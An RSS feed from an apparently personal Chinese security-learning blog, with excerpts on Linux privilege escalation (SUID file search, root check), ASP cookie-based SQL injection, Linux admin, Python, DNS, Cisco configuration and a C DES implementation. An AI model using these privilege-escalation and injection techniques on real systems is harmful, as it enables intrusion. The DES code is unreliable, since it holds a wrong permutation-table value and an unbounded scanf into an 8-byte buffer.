&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>验证&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>重新用wyb连接，此时即为root权限
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ cd /root &lt;span style="color:#75715e">#若能切换到此目录即证明确实获得了root权限&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost root&lt;span style="color:#f92672">]&lt;/span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>anaconda-ks.cfg install.log install.log.syslog
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件&lt;/h3>
&lt;ul>
&lt;li>find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/li>
&lt;/ul></description></item><item><title>Linux 之用户和用户组</title><link>https://wyb0.cn/posts/2016/linux-user/</link><pubDate>Sun, 17 Apr 2016 20:48:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-user/</guid><description>&lt;h3 id="0x01-新建用户">0x01 新建用户&lt;/h3>
&lt;p>环境：Ubuntu 14.04.4&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Step1：添加新用户&lt;br>
useradd -r -m -s /bin/bash 用户名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Step2:配置新用户密码&lt;br>
passwd 用户名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Step3：给新添加的用户增加root权限&lt;br>
visudo&lt;br>
然后添加：&lt;br>
用户名 ALL=(ALL:ALL) ALL&lt;/p></description></item><item><title>[转] 短</title><link>https://wyb0.cn/posts/2016/short/</link><pubDate>Sun, 17 Apr 2016 15:49:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/short/</guid><description>&lt;center>
&lt;font size="15">短&lt;/font>
俄罗斯某诗人
&lt;/center>
&lt;center>
### 一天很短 
### 短得来不及拥抱清晨 
### 就已经手握黄昏
&lt;h3 id="一年很短">一年很短&lt;/h3>
&lt;h3 id="短得来不及细品初春殷红窦绿">短得来不及细品初春殷红窦绿&lt;/h3>
&lt;h3 id="就要打点素裹秋霜">就要打点素裹秋霜&lt;/h3>
&lt;h3 id="一生很短">一生很短&lt;/h3>
&lt;h3 id="短的来不及享用美好年华">短的来不及享用美好年华&lt;/h3>
&lt;h3 id="就已经身处迟暮">就已经身处迟暮&lt;/h3>
&lt;h3 id="总是经过的太快">总是经过的太快&lt;/h3>
&lt;h3 id="领悟的太晚">领悟的太晚&lt;/h3>
&lt;h3 id="我们要学会珍惜">我们要学会珍惜&lt;/h3>
&lt;h3 id="珍惜人生路上的亲情友情同事情同学情朋友情">珍惜人生路上的亲情、友情、同事情、同学情、朋友情&lt;/h3>
&lt;h3 id="一旦擦身而过">一旦擦身而过&lt;/h3>
&lt;h3 id="也许永不邂逅">也许永不邂逅&lt;/h3>
&lt;/center></description></item><item><title>Linux 之权限</title><link>https://wyb0.cn/posts/2016/linux-permission-settings/</link><pubDate>Sun, 17 Apr 2016 10:03:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-permission-settings/</guid><description>&lt;p>主要有三种参数：rwx
对于文件来说：分别是读/写/执行&lt;br>
对于目录来说：r读目录结构；w操作目录结构；x进入目录&lt;br>
如：drwxr&amp;ndash;r&amp;ndash; 3 root root 4096 Jun 25 08:35 .ssh&lt;br>
若账号vbird不属于root群组，则vbird可以查询此目录下的文件名，没有x权限所以不能切换到此目录中&lt;/p></description></item><item><title>Linux 之 vim</title><link>https://wyb0.cn/posts/2016/linux-vim/</link><pubDate>Fri, 15 Apr 2016 21:03:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-vim/</guid><description>&lt;h3 id="0x00-vim的安装及配置">0x00 Vim的安装及配置：&lt;/h3>
&lt;ul>
&lt;li>安装vim&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>yum install vim
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>配置文件的位置&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>在目录 /etc/ 下面，有个名为vimrc的 文件，
这是系统中公共的vim配置文件，对所有用户都有效。
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>设置语法高亮显示&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1) 打开vimrc，添加以下语句来使得语法高亮显示：
 syntax on
2) 如果此时语法还是没有高亮显示，那么在/etc目录下的profile文件中添加以下语句：
 export TERM=xterm-color
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>设置Windows风格的C/C++自动缩进（添加以下set语句到vimrc中）&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1）设置Tab为4个空格
 set tabstop=4 #设定tab长度为4
 set softtabstop=4 #使按退格键时可以一次删除4个空格
 set shiftwidth=4 #表示每一级缩进的长度，一般设置成跟softtabstop一样
 set expandtab/noexpandtab #缩进用空格/制表符表示
2）自动缩进
 set autoindent/noautoindent #设置每行的缩进值与上一行相等/不相等(我未启用)
3）使用 C/C++ 语言的自动缩进方式
 set cindent
4）在左侧显示文本的行号
 set nu
5）搜索设置
 set incsearch #输入搜索内容时就显示搜索结果
 set hlsearch #搜索时高亮显示被找到的文本
6）如果没有下列语句，就加上吧
 if &amp;amp;term==&amp;#34;xterm&amp;#34;
 set t_Co=8
 set t_Sb=^[[4%dm
 set t_Sf=^[[3%dm
 endif
&lt;/code>&lt;/pre>&lt;h3 id="0x01-vim编辑器的三种模式">0x01 Vim编辑器的三种模式&lt;/h3>
&lt;ul>
&lt;li>命令行模式&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$vim 文件名 #直接进入命令行模式
Ctrl+ZZ#可保存文件

5dd/4yy#剪切5行/复制4行
p #粘贴到当前行后面
u #一直点的话会一直撤销，直到回复到文件最初状态

gg/G #光标移动到首行/末行
H/M/L #光标移动到屏幕显示的首行/中间/末行
0/$ #光标移动到行首/行尾
w/b #光标跳到下一个/上一个单词

o #在下一行插入
Ctrl+g #显示文本的信息

dt% #删除所有内容直到遇到 %
d0/d$或D #删除从光标到行首/行尾的字符
3dw #删除3个单词

v+方向键 #可以从当前光标向各方向选择字符或行
4+向下的方向键 #光标向下移动4行

/和？#向下和向上搜索
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>末行模式&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>:wq #推出并保存
:wq! #强制退出并保存
:num #跳到第n行
:$	 #移动到最后一行
:/aaaa #向下搜aaaa这个字符串 n可以定位到下一个匹配的字符，N向上
:?aaaa #向上搜索
:%s/set/ddd/g #将字符串set全部替换为ddd
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>插入模式&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>在命令行模式直接点击i即可进入
&lt;/code>&lt;/pre></description></item><item><title>Python 的正则</title><link>https://wyb0.cn/posts/2016/python-regular/</link><pubDate>Fri, 05 Feb 2016 11:38:23 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-regular/</guid><description>&lt;h3 id="0x00-正则表达式">0x00 正则表达式&lt;/h3>
&lt;p>正则表达式是用来匹配字符串的异常强大的东西，可以用来匹配邮箱、域名等字符串&lt;/p>
&lt;h3 id="0x01-符号">0x01 符号&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/regular_atomic_character.png" alt="75">&lt;/p>
&lt;h3 id="0x02-特殊字符">0x02 特殊字符&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/regular_metacharacters.png" alt="75">&lt;/p>
&lt;h3 id="0x03-常用的模块属性">0x03 常用的模块属性&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/regular_modifier.png" alt="75">&lt;/p></description></item><item><title>Python 的线程</title><link>https://wyb0.cn/posts/2016/python-thread/</link><pubDate>Wed, 03 Feb 2016 12:44:38 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-thread/</guid><description>&lt;p>Python的参数传递其实传递的是对象，当传递可变对象(列表、队列)时相当于引用传递，可以修改对象的原始值，当传递不可变对象(字符串、整型)时就相当于传值，不能直接修改原始对象。&lt;/p></description></item><item><title>Python 的面向对象</title><link>https://wyb0.cn/posts/2016/python-object-oriented/</link><pubDate>Mon, 25 Jan 2016 11:17:59 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-object-oriented/</guid><description>&lt;h3 id="0x00-面向对象">0x00 面向对象&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>面向对象是为了解决系统的可维护性，可扩展性，可重用性&lt;/p>
&lt;/li>
&lt;li>
&lt;p>三个基本特征：封装、继承、多态&lt;/p>
&lt;ul>
&lt;li>
&lt;p>封装：对一类事物，将其相同特点和功能提取出来，所共有的特点叫做属性，共有的功能就叫做方法，将属性和方法组合在一起就叫做封装。&lt;br>
如：人具有姓名、年龄、性别，这些就是属性，人可以说话、可以走、可以跑，这些就是方法，封装起来就是一个类，而类的实例化就是对象&lt;/p></description></item><item><title>Python 的函数式编程</title><link>https://wyb0.cn/posts/2016/python-functional-programming/</link><pubDate>Thu, 21 Jan 2016 21:13:17 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-functional-programming/</guid><description>&lt;h3 id="0x00-函数式编程">0x00 函数式编程&lt;/h3>
&lt;p>首先说一下高阶函数，能将函数作为参数来接收的函数就可以称为高阶函数，如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">add&lt;/span>(x,y,f):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> f(x) &lt;span style="color:#f92672">+&lt;/span> f(y)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print add(&lt;span style="color:#ae81ff">7&lt;/span>,&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>,abs) &lt;span style="color:#75715e">#abs是求绝对值的函数，这里返回的值为10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将函数作为参数传入，这样的函数就是高阶函数，而函数式编程就是指这种抽象程度很高的编程范式。&lt;br>
函数式编程的一个特点就是可以将函数作为参数，还允许返回一个函数。&lt;br>
纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。&lt;br>
允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。&lt;/p></description></item><item><title>ASP Cookie 处联合注入</title><link>https://wyb0.cn/posts/2015/injection-of-asp-in-the-cookie/</link><pubDate>Fri, 04 Dec 2015 19:42:19 +0000</pubDate><guid>https://wyb0.cn/posts/2015/injection-of-asp-in-the-cookie/</guid><description>&lt;h3 id="0x00-cookie注入的使用">0x00 Cookie注入的使用&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>三大Web提交方式&lt;/p>
&lt;ul>
&lt;li>GET：直接在浏览器上面访问地址&lt;/li>
&lt;li>POST：提交表单(会员注册、文件上传等)&lt;/li>
&lt;li>COOKIE：访问网站下面自带的身份验证的值&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Cookie注入利用时机&lt;br>
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。
&lt;img src="https://wyb0.cn/img/post/cookie_injection_conditions.png" alt="Cookie注入条件">&lt;/p></description></item><item><title>搭建 DNS 服务器</title><link>https://wyb0.cn/posts/2015/set-up-dns-server/</link><pubDate>Tue, 14 Jul 2015 14:15:13 +0000</pubDate><guid>https://wyb0.cn/posts/2015/set-up-dns-server/</guid><description>&lt;p>环境: ubuntu-16.04.7-server-amd64.iso&lt;/p>
&lt;p>安装系统时选上 dns 服务，或者 apt install bind9 安装&lt;/p>
&lt;h3 id="0x01-配置前">0x01 配置前&lt;/h3>
&lt;ul>
&lt;li>涉及到的几个配置文件&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/etc/bind/named.conf，主配置文件，通过 include 关键字加载其他仨配置文件
/etc/bind/named.conf.options，转发器配置文件
/etc/bind/named.conf.local，用户配置文件，一般存放 DNS 记录
/etc/bind/named.default-zones，默认区域文件
/etc/bind/aaa.com.zone，正向解析文件
/etc/bind/aaa.com.arpa，反向解析文件
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>备份&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>cp /etc/bind/named.config.local /etc/bind/named.config.local.bak
cp /etc/bind/named.config.options /etc/bind/named.config.options.bak
&lt;/code>&lt;/pre>&lt;h3 id="0x02-配置-namedconfoptions">0x02 配置 named.conf.options&lt;/h3>
&lt;p>first 先转发给 forwarders 列表进行查询，查询不到再查本地&lt;/p></description></item><item><title>中小企业网络搭建</title><link>https://wyb0.cn/posts/2015/small-and-medium-enterprise-network-structures/</link><pubDate>Mon, 13 Jul 2015 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2015/small-and-medium-enterprise-network-structures/</guid><description>&lt;h3 id="0x00-中小企业需求分析">0x00 中小企业需求分析&lt;/h3>
&lt;ol>
&lt;li>搭建企业私有局域网络环境，使用交换机、路由器等网络设备完成由局域网到互联网的接入。&lt;/li>
&lt;li>对网络设备能够方便地进行远程管理。&lt;/li>
&lt;li>在局域网中公司部门间进行vlan划分，实现安全管理。&lt;/li>
&lt;li>对三层设备路由技术这方面采取RIPV2协议或OSPF协议。&lt;/li>
&lt;li>配置访问控制列表（ACL）以对网络数据进行有效的分类和控制，限制终端之间的相互访问。&lt;/li>
&lt;li>内网通过配置PAT技术实现与外网之间的通信。&lt;/li>
&lt;/ol>
&lt;h3 id="0x01-所需设备">0x01 所需设备&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/enterprise_network_the_required_equipment.png" alt="中小企业所需设备">&lt;/p></description></item><item><title>利用 C 语言简单实现单重 DES</title><link>https://wyb0.cn/posts/2015/single-des-simple-implementation/</link><pubDate>Fri, 22 May 2015 16:52:55 +0000</pubDate><guid>https://wyb0.cn/posts/2015/single-des-simple-implementation/</guid><description>&lt;h3 id="0x00-简介">0x00 简介&lt;/h3>
&lt;pre tabindex="0">&lt;code>此程序通过单重des实现8个字节的加密和解密。
新建一个工程，这个工程需要3个cpp文件(c文件也可以)和2个头文件。
cpp文件：main.cpp、des.cpp、status.cpp
头文件：des.h、status.h
&lt;/code>&lt;/pre>&lt;h3 id="0x01-代码">0x01 代码&lt;/h3>
&lt;ul>
&lt;li>以下为主函数main.cpp的内容：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
#include &amp;#34;status.h&amp;#34;
#include &amp;#34;des.h&amp;#34;

int main()
{
 char M[8],Key[9];
 printf(&amp;#34;Input Plaintext :&amp;#34;);
 scanf(&amp;#34;%s&amp;#34;,&amp;amp;M);
 printf(&amp;#34;Input Key :&amp;#34;);
 scanf(&amp;#34;%s&amp;#34;,&amp;amp;Key);

 SetKey(Key);//生成16个子秘钥

 printf(&amp;#34;加密：&amp;#34;);
 Des(M,&amp;#39;e&amp;#39;);
 printf(&amp;#34;%s\n&amp;#34;,M);

 printf(&amp;#34;解密：&amp;#34;);
 Des(M,&amp;#39;d&amp;#39;);
 printf(&amp;#34;%s\n&amp;#34;,M);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>以下为des.cpp的内容：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;#34;status.h&amp;#34;
#include &amp;#34;des.h&amp;#34;

void ByteToBit(const char *In,bool *Out,int bits)
{
 for (int j=0;j&amp;lt;bits;j++)
 Out[j]=(In[j/8]&amp;gt;&amp;gt;(j%8))&amp;amp; 1;
}

void BitToByte(bool *In,char *Out,int bits)
{
 memset(Out,0,(bits+7)/8);
 for (int k=0;k&amp;lt;bits;k++)
 Out[k/8]|=In[k]&amp;lt;&amp;lt;(k%8);
}

void Transform(bool *Y,bool *X,const char *Table,int len)
{
 for (int l=0;l&amp;lt;len;l++)
 Temp[l]=X[Table[l]-1];
 memcpy(Y,Temp,len);
}

void Des(char *m,char ch)
{
 bool Tem[32];
 ByteToBit(m,P,64);
 Transform(P,P,IP1_Table,64);
 Li=&amp;amp;P[0];
 Ri=&amp;amp;P[32];

 if (ch==&amp;#39;e&amp;#39;)
 {
 for (i=0;i&amp;lt;16;i++)
 {
 memcpy(Tem,Ri,32);//临时存放明文的右半部分
 f(Ri,SubKey[i]);
 XOR(Ri,Li,32);
 memcpy(Li,Tem,32);//将明文的右半部分写入Li
 }
 } 
 else
 {
 for (i=15;i&amp;gt;=0;i--)
 {
 memcpy(Tem,Li,32);//临时存放明文的右半部分
 f(Li,SubKey[i]);
 XOR(Li,Ri,32);
 memcpy(Ri,Tem,32);//将明文的右半部分写入Li
 }
 }

 Transform(P,P,IP2_Table,64);
 BitToByte(P,m,64);
}

void f(bool *R,bool *k)
{
 bool T[48];
 Transform(T,R,E_Table,48);//32位的Ri扩展为48位
 XOR(T,k,48);//Ri和轮秘钥的异或
 S_Box_f(T,R);
 Transform(R,R,P_Table,32);
}

void XOR(bool *R,bool *k,int len)
{
 for (int m=0;m&amp;lt;len;m++)
 R[m]=R[m]^k[m];
}

void S_Box_f(bool *B,bool *C)
{
 int a,b;
 for (int k=0;k&amp;lt;8;k++)
 {
 a=B[0]*2+B[5];
 b=B[1]*8+B[2]*4+B[3]*2+B[4];
 ByteToBit(&amp;amp;S_Box[k][a][b],C,4);
 B+=6;
 C+=4;
 }
}

//以下求得子秘钥
void SetKey(char *KEY)
{
 ByteToBit(KEY,K,64);
 Transform(K,K,PC1_Table,56);
 printf(&amp;#34;\n\n\n&amp;#34;);
 Ci=&amp;amp;K[0];
 Di=&amp;amp;K[28];
 for (int j=0;j&amp;lt;16;j++)
 {
 MovKey(Ci,28,LOOP_Table[j]);
 MovKey(Di,28,LOOP_Table[j]);
 Transform(SubKey[j],K,PC2_Table,48);
 }
}

void MovKey(bool *LR,int len,int loop)
{
 memcpy(Temp,LR,loop);
 memcpy(LR,LR+loop,len-loop);
 memcpy(LR+len-loop,Temp,loop);
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>以下为status.cpp中的内容：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include &amp;#34;status.h&amp;#34;

int i;
bool P[64],K[64];
bool *Li,*Ri;
bool *Ci,*Di;
bool Temp[100];
bool SubKey[16][48];

//子密钥各轮移位位数
const char LOOP_Table[16]={
	1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1
};

//16轮乘积变换前的初始变换
const char IP1_Table[64]={
	58, 50, 42, 34, 26, 18, 10, 2,
		60, 52, 44, 36, 28, 20, 12, 4,
		62, 54, 46, 38, 30, 22, 14, 6,
 64, 56, 48, 40, 32, 24, 16, 8,
 57, 49, 41, 33, 25, 17, 9, 1,
 59, 51, 43, 35, 27, 19, 11, 3,
 61, 53, 45, 37, 29, 21, 13, 5,
 63, 55, 47, 39, 31, 23, 15, 7
};

//16轮乘积变换后的逆初始变换
const char IP2_Table[64]={
	40, 8, 48, 16, 56, 24, 64, 32,
		39, 7, 47, 15, 55, 23, 63, 31,
 38, 6, 46, 14, 54, 22, 62, 30,
 37, 5, 45, 13, 53, 21, 61, 29,
 36, 4, 44, 12, 52, 20, 60, 28,
 35, 3, 43, 11, 51, 19, 59, 27,
 34, 2, 42, 10, 50, 18, 58, 26,
 33, 1, 41, 9, 49, 17, 57, 25
};

//扩展置换，将32位的数据扩展为48位
const char E_Table[48]={
	32, 1, 2, 3, 4, 5,
		4, 5, 6, 7, 8, 9,
		8, 9, 10, 11, 12, 13,
		12, 13, 14, 15, 16, 17,
		16, 17, 18, 19, 20, 21,
		20, 21, 22, 23, 24, 25,
		24, 25, 26, 27, 28, 29,
		28, 29, 30, 31, 32, 1
};

//经过S盒后的P置换
const char P_Table[32]={
	16, 7, 20, 21, 29, 12, 28, 17,
		1, 15, 23, 26, 5, 18, 31, 10,
		2, 8, 24, 14, 32, 27, 3, 9,
		19, 13, 30, 6, 22, 11, 4, 25
};

//子密钥换位表PC-1
const char PC1_Table[56]={
	57, 49, 41, 33, 25, 17, 9,
		1, 58, 50, 42, 34, 26, 18,
		10, 2, 59, 51, 43, 35, 27,
		19, 11, 3, 60, 52, 44, 36,
		63, 55, 47, 39, 31, 33, 15,
		7, 62, 54, 46, 38, 30, 22,
		14, 6, 61, 53, 45, 37, 29,
		21, 13, 5, 28, 20, 12, 4
};

//子密钥换位表PC-2(去掉了PC-1的最后一列)
const char PC2_Table[48]={
	14, 17, 11, 24, 1, 5,
		3, 28, 15, 6, 21, 10,
		23, 19, 12, 4, 26, 8,
		16, 7, 27, 20, 13, 2,
		41, 52, 31, 37, 47, 55,
		30, 40, 51, 45, 33, 48,
		44, 49, 39, 56, 34, 53,
		46, 42, 50, 36, 29, 32
};

//S盒
const char S_Box[8][4][16]={
	{
		{14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7},//S1
		{0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8},
		{4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0},
		{15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13}
	},
	{
		{15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10},//S2
		{3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5},
		{0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15},
		{13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9}
	},
	{
		{10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8},//S3
		{13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1},
		{13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7},
		{1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12}
	},
	{
		{7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15},//S4
		{13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9},
		{10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4},
		{3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14}
	},
	{
		{2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9},//S5
		{14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6},
		{4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14},
		{11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3}
	},
	{
		{12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11},//S6
		{10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8},
		{9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6},
		{4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13}
	},
	{
		{4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1},//S7
		{13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6},
		{1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2},
		{6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12}
	},
	{
		{13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7},//S8
		{1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2},
		{7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8},
		{2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11}
	}
};
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>以下为des.h的内容：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//函数的声明

void ByteToBit(const char *In,bool *Out,int bits);//将字节转换为位
void BitToByte(bool *In,char *Out,int bits);//将位转换为字节
void Transform(bool *Y,bool *X,const char *Table,int len);//按表变换位置
void SetKey(char *KEY);//生成子秘钥
void MovKey(bool *LR,int len,int loop);//秘钥的LS移位
void Des(char *m,char ch);//DES
void XOR(bool *R,bool *k,int len);//异或
void S_Box_f(bool *B,bool *C);//在S盒置换
void f(bool *Ri,bool *k);//f函数
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>以下为status.h的内容：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//变量的声明

extern int i;
extern bool P[64],K[64];//存放明文和秘钥
extern bool *Li,*Ri;//指向明文的左右两部分
extern bool *Ci,*Di;//指向子秘钥的左右两部分
extern bool Temp[100];
extern bool SubKey[16][48];//存放16轮的秘钥

extern const char IP1_Table[64];
extern const char IP2_Table[64];
extern const char E_Table[48];
extern const char P_Table[32];
extern const char PC1_Table[56];
extern const char PC2_Table[48];
extern const char LOOP_Table[16];
extern const char S_Box[8][4][16];
&lt;/code>&lt;/pre>&lt;h3 id="0x02-执行结果">0x02 执行结果&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/des.png" alt="单重DES运行结果">&lt;/p></description></item><item><title>思科交换机基本配置</title><link>https://wyb0.cn/posts/2015/cisco-switch-basic-configuration/</link><pubDate>Wed, 06 May 2015 23:46:26 +0000</pubDate><guid>https://wyb0.cn/posts/2015/cisco-switch-basic-configuration/</guid><description>&lt;h3 id="0x00-简单配置命令">0x00 简单配置命令&lt;/h3>
&lt;pre tabindex="0">&lt;code>Switch&amp;gt;enable(配置交换机名称)
Switch(config)#hostname S

S(config)#enable password 222//(加密特权密码，密码为222)
S(config)#no enable password //(取消enable密码)
S(config)#enable secret 333//(设置后用show命令时不能看到密码)
S(config)#no enable secret //(取消enable密码)

S(config)#line vty 0 4//(有5个虚拟终端，即0-4)
S(config-line)#password 444//(设置虚拟终端密码)
S(config-line)#login//(使密码生效)

S(config)#line console 0//(设置控制台密码)
S(config-line)#password 111
S(config-line)#login
S(config)#line con 0//(取消控制台密码)
S(config-line)#no password

S(config-line)#exec-timeout 5 30//(超时时间)(分、秒)

S(config)#no ip domain-lookup//(禁止名称解析)
&lt;/code>&lt;/pre>&lt;h3 id="0x01-配置交换机管理ip默认网关">0x01 配置交换机管理IP、默认网关&lt;/h3>
&lt;pre tabindex="0">&lt;code>S(config)#interface vlan 1 //(配置交换机管理IP、子网掩码)
S(config-if)#ip address 192.168.1.1 255.255.255.0
S(config-if)#no shutdown

S(config)# exit
S(config)#ip default-gateway 192.168.1.250//(默认网关)
&lt;/code>&lt;/pre>&lt;h3 id="0x02-配置交换机的端口速率端口双工模式">0x02 配置交换机的端口速率、端口双工模式&lt;/h3>
&lt;pre tabindex="0">&lt;code>S(config)#//(端口双工模式)
S(config)#interface f0/1
S(config-if)#duplex ?
 auto Enable AUTO duplex configuration
 full Force full duplex operation
 half Force half-duplex operation
S(config-if)#duplex auto

S(config-if)#speed ? // (配置交换机的端口速率)
 10 Force 10 Mbps operation
 100 Force 100 Mbps operation
 auto Enable AUTO speed configuration
S(config-if)#speed 100

Switch#write //(保存配置)
Building configuration...
[OK]
&lt;/code>&lt;/pre></description></item><item><title>About</title><link>https://wyb0.cn/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://wyb0.cn/about/</guid><description>&lt;h3 id="id">ID&lt;/h3>
&lt;ul>
&lt;li>reber&lt;/li>
&lt;/ul>
&lt;h3 id="e-mail">E-mail&lt;/h3>
&lt;ul>
&lt;li>reber0ask#qq.com&lt;/li>
&lt;/ul>
&lt;h3 id="wechat--qq">WeChat &amp;amp; QQ&lt;/h3>
&lt;div style="width:350px;margin-left:40px;margin-top:10px;display:none;" >
 &lt;div style="float:left">
 &lt;img src="https://wyb0.cn/img/wx.png" style="width:150px;height:150px;" title="添加微信">
 &lt;/div>
 &lt;div style="float:right;">
 &lt;img src="https://wyb0.cn/img/qq.png" style="width:150px;height:150px;" title="添加QQ">
 &lt;/div>
&lt;/div>
&lt;h3 id="about-me">About Me&lt;/h3>
&lt;ul>
&lt;li>不断学习&lt;/li>
&lt;li>努力工作&lt;/li>
&lt;li>网络安全爱好者&lt;/li>
&lt;/ul>
&lt;h3 id="about-this-site">About this site&lt;/h3>
&lt;ul>
&lt;li>从 2015 年 5 月份开始陆续写博客&lt;/li>
&lt;li>博客主要用于记录自己的一些学习笔记之类的东西，供自己学习参考使用&lt;/li>
&lt;li>博客部分内容是长时间积累的，所以来源难以查找，如果侵权请与我联系&lt;/li>
&lt;/ul>
&lt;h3 id="about-reprinted">About Reprinted&lt;/h3>
&lt;ul>
&lt;li>只要在文章头部或尾部注明原文链接即可随意转载，如下：
&lt;img src="https://wyb0.cn/img/about_reprinted.jpg" alt="70">&lt;/li>
&lt;/ul></description></item><item><title>Friends</title><link>https://wyb0.cn/friends/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://wyb0.cn/friends/</guid><description>&lt;ul>
&lt;li>&lt;a href="https://www.yl0.org/?_blank">信安未央&lt;/a>&lt;/li>
